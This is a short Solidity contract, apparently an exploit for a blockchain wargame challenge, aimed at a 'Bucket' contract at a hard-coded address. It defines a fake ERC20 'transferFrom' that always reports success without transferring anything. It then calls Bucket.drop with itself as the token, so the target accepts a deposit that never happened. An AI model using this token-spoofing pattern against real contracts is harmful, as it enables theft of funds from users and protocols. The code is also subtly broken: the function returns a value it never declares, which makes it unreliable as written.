contract EmitWinner {
    address bucketAddress = 0x873289a1aD6Cf024B927bd13bd183B264d274c68;

    constructor() {}

    
    
    function transferFrom(address from, address to, uint256 amount) public {
        return true;
    }

    function drop() external {
        address erc20 = address(this);
        uint256 amount = 1;
        Bucket(bucketAddress).drop(erc20, amount);
    }
}
